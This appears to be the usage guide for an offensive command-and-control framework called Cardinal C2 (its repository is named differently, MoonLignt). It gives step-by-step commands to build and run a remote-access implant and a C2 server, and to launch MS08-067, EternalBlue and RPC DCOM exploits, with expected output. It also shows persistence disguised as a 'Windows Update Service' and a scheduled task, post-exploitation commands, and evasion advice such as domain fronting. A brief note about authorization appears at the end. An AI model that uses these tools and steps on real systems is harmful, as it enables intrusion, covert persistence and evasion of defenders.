# Usage Guide - Cardinal C2 Framework

## Table of Contents

1. [Installation](#installation)
2. [Building](#building)
3. [Server Setup](#server-setup)
4. [Client Deployment](#client-deployment)
5. [GUI Operation](#gui-operation)
6. [Exploit Usage](#exploit-usage)
7. [Post-Exploitation](#post-exploitation)
8. [Troubleshooting](#troubleshooting)

---

## Installation

### Prerequisites

Before building Cardinal C2, ensure you have:

1. **MinGW-w64** or **Microsoft Visual C++**
   - Download: https://mingw-w64.org/
   - Or install Visual Studio 2019+ with C++ workload

2. **.NET Framework 4.8 SDK**
   - Download: https://dotnet.microsoft.com/download/dotnet-framework/net48

3. **NASM** (Optional, for shellcode compilation)
   - Download: https://www.nasm.us/

4. **Git** (for cloning the repository)

### Installation Steps

```powershell
# Clone the repository
git clone https://github.com/yourusername/MoonLignt-C2-Framework.git
cd MoonLignt-C2-Framework

# Or extract from ZIP
Expand-Archive MoonLignt-C2-Framework.zip -DestinationPath .
```

---

## Building

### Automated Build (Recommended)

```powershell
# Run the PowerShell build script
.\build.ps1
```

This script will:
- Check for required build tools
- Compile the C2 server
- Compile the client implant
- Build all exploit modules
- Compile the GUI application
- Copy all binaries to `bin/` directory

### Manual Build

If you prefer to build components individually:

#### Build Server

```powershell
cd server
gcc -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0500 main.c -o Cardinal-server.exe -lws2_32
cd ..
```

#### Build Client

```powershell
cd client
gcc -Wall -O2 -DWIN32 -D_WIN32_WINNT=0x0500 -mwindows implant.c -o Cardinal-implant.exe -lws2_32 -ladvapi32 -luser32
nasm -f bin -o shellcode.bin shellcode.asm
cd ..
```

#### Build Exploits

```powershell
cd exploits
gcc -Wall -O2 -DWIN32 ms08_067.c -o ms08-067.exe -lws2_32
gcc -Wall -O2 -DWIN32 ms03_026.c -o ms03-026.exe -lws2_32
gcc -Wall -O2 -DWIN32 ms17_010.c -o ms17-010.exe -lws2_32
cd ..
```

#### Build GUI

```powershell
cd gui
dotnet build CardinalC2.csproj -c Release -o ..\bin\gui
cd ..
```

---

## Server Setup

### Starting the Server

The C2 server is a console application that manages implant connections.

**Default Configuration:**

```powershell
# Start on default port 4444
.\bin\Cardinal-server.exe
```

**Custom Port:**

```powershell
# Start on custom port
.\bin\Cardinal-server.exe 8080
```

### Server Console Commands

Once the server is running, you can use these commands:

| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List all active sessions | `Cardinal> sessions` |
| `exec <id> <cmd>` | Execute command on a session | `Cardinal> exec 0 ipconfig` |
| `kill <id>` | Terminate a session | `Cardinal> kill 0` |
| `broadcast <msg>` | Send to all sessions | `Cardinal> broadcast test` |
| `help` | Show available commands | `Cardinal> help` |
| `exit` | Shutdown the server | `Cardinal> exit` |

### Server Output Example

```
[+] Server listening on port 4444
[+] New session established: 0 from 192.168.1.100
[+] Session 0 info: WINXP-PC\Administrator on Windows 5.1 Build 2600 (PID: 1234)
```

---

## Client Deployment

### Manual Execution

Run the implant on the target system:

```cmd
Cardinal-implant.exe <server_ip> <port>
```

Example:
```cmd
Cardinal-implant.exe 192.168.1.10 4444
```

### Stealth Deployment Options

**1. Service Installation** (requires admin):
```cmd
sc create "Windows Update Service" binPath= "C:\Windows\Temp\implant.exe 192.168.1.10 4444" start= auto
sc start "Windows Update Service"
```

**2. Scheduled Task**:
```cmd
schtasks /create /tn "SystemUpdate" /tr "C:\Temp\implant.exe 192.168.1.10 4444" /sc onlogon /ru System
```

**3. Registry Run Key**:
The implant can install itself via the `PERSIST` command from the server.

### Implant Features

- **Auto-reconnect**: Attempts reconnection every 10 seconds if disconnected
- **Heartbeat**: Sends keepalive every 30 seconds
- **Silent operation**: No console window
- **System info gathering**: Automatically reports hostname, username, OS

---

## GUI Operation

### Launching the GUI

```powershell
.\bin\gui\CardinalC2.exe
```

### GUI Components

#### 1. Sessions Tab

**View Active Sessions:**
- Session ID
- IP Address
- Hostname
- Username
- OS Version
- Process ID
- Connection Time

**Interact with Sessions:**
- Double-click a session to open an interactive console
- Right-click for context menu:
  - Interact
  - File Browser (coming soon)
  - Process List (coming soon)
  - Kill Session

#### 2. Listeners Tab

**Start a New Listener:**

1. Click "Start Listener"
2. Configure:
   - **Type**: TCP, HTTP, HTTPS, DNS
   - **Port**: Default 4444
3. Click "Start"

The listener will appear in the list with status "ACTIVE".

**Stop a Listener:**

1. Select listener in the list
2. Click "Stop Listener"

#### 3. Exploits Tab

**Available Exploits:**

- **Windows Exploits**
  - MS08-067 - NetAPI32 RPC
  - MS17-010 - EternalBlue SMB
  - MS03-026 - RPC DCOM
  - MS06-040 - Server Service

**Launch an Exploit:**

1. Double-click an exploit
2. Configure parameters:
   - Target IP
   - OS Type
   - LHOST (your IP)
   - LPORT (listener port)
3. Click "Launch Exploit"
4. Monitor output in the text area

#### 4. Payload Generator

**Generate Custom Payloads:**

1. Go to File > Generate Payload
2. Configure:
   - Format (Raw, C Array, Hex, EXE)
   - LHOST
   - LPORT
   - Architecture (x86/x64)
3. Click "Generate"
4. Save to file

---

## Exploit Usage

### MS08-067 (NetAPI32 RPC Buffer Overflow)

**Target**: Windows XP, 2003, 2000

**Usage**:
```powershell
.\bin\exploits\ms08-067.exe <target_ip> <os_type>
```

**OS Type Values**:
- 0 = Windows XP SP2
- 1 = Windows XP SP3
- 2 = Windows Server 2003 SP1
- 3 = Windows Server 2003 SP2
- 4 = Windows 2000 SP4

**Example**:
```powershell
# Exploit Windows XP SP3
.\bin\exploits\ms08-067.exe 192.168.1.100 1
```

**Expected Output**:
```
[*] Target: Windows XP SP3
[*] Return address: 0x7E429353
[*] Connecting to 192.168.1.100:445...
[+] Connected successfully
[*] Sending exploit...
[+] Exploit sent successfully
[+] Exploit completed. Check for incoming connection.
```

### MS17-010 (EternalBlue)

**Target**: Windows XP, Vista, 7, 8, Server 2003/2008/2012

**Usage**:
```powershell
.\bin\exploits\ms17-010.exe <target_ip> [shellcode_file]
```

**Example**:
```powershell
# Check vulnerability
.\bin\exploits\ms17-010.exe 192.168.1.100

# With custom shellcode
.\bin\exploits\ms17-010.exe 192.168.1.100 payload.bin
```

**Expected Output**:
```
[*] Checking if target is vulnerable...
[+] Target supports SMBv1
[*] Launching EternalBlue exploit...
[+] Connected
[*] Sending SMB negotiate...
[+] Received negotiate response (139 bytes)
[*] Sending exploit (1024 bytes)...
[+] Exploit sent
```

### MS03-026 (RPC DCOM)

**Target**: Windows 2000, XP, Server 2003

**Usage**:
```powershell
.\bin\exploits\ms03-026.exe <target_ip> <target_type>
```

**Target Types**:
- 0 = Windows 2000 SP0
- 1 = Windows 2000 SP4
- 2 = Windows XP SP0
- 3 = Windows XP SP1
- 4 = Windows Server 2003

**Example**:
```powershell
# Exploit Windows 2000 SP4
.\bin\exploits\ms03-026.exe 192.168.1.50 1
```

---

## Post-Exploitation

### Command Execution

From the server console or GUI:

```
exec 0 whoami
exec 0 ipconfig /all
exec 0 net user
exec 0 systeminfo
```

### Persistence

Install persistence on the target:

```
# Via server console
exec 0 PERSIST

# This installs a registry Run key
```

### Privilege Escalation

Attempt privilege escalation:

```
exec 0 ELEVATE
```

This attempts to enable debug privileges.

### File Operations (GUI)

Future features:
- File upload/download
- File browser
- Registry editor

---

## Troubleshooting

### Build Issues

**Problem**: `gcc: command not found`

**Solution**: Install MinGW-w64 and add to PATH:
```powershell
$env:Path += ";C:\mingw64\bin"
```

**Problem**: `.NET SDK not found`

**Solution**: Install .NET Framework 4.8 SDK from Microsoft

### Connection Issues

**Problem**: Implant won't connect

**Solutions**:
- Check firewall rules on server
- Verify IP address and port
- Ensure server is listening
- Check antivirus isn't blocking

**Problem**: "Connection refused"

**Solutions**:
- Verify server is running
- Check correct port number
- Ensure no firewall blocking

### Exploit Issues

**Problem**: "Target does not appear vulnerable"

**Solutions**:
- Verify target OS version
- Check SMB service is running (445)
- Ensure target is not patched
- Try different OS type setting

**Problem**: Exploit sends but no session

**Solutions**:
- Check firewall on attacker machine
- Verify LHOST is correct
- Ensure payload has correct IP/port
- Check AV isn't blocking implant

### GUI Issues

**Problem**: GUI won't start

**Solution**: Install .NET Framework 4.8

**Problem**: "Cannot connect to server"

**Solution**: Start the C2 server first

---

## Best Practices

### For Red Team Engagements

1. **Always get written authorization**
2. **Document all activities**
3. **Use VPN/proxy for anonymity**
4. **Clean up after engagement**
5. **Report findings responsibly**

### Operational Security

1. Use encrypted communications
2. Rotate infrastructure
3. Use domain fronting when possible
4. Implement sleep/jitter in implants
5. Monitor for blue team detection

### Cleanup

After testing:

```powershell
# Remove persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f

# Kill implant process
taskkill /F /IM Cardinal-implant.exe

# Remove files
del C:\Temp\Cardinal-implant.exe
```

---

## Additional Resources

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [CVE Database](https://cve.mitre.org/)

---

## Support

For issues, questions, or contributions:
- Open an issue on GitHub
- Check existing documentation
- Review source code comments

**Remember: Use responsibly and only on authorized systems!**
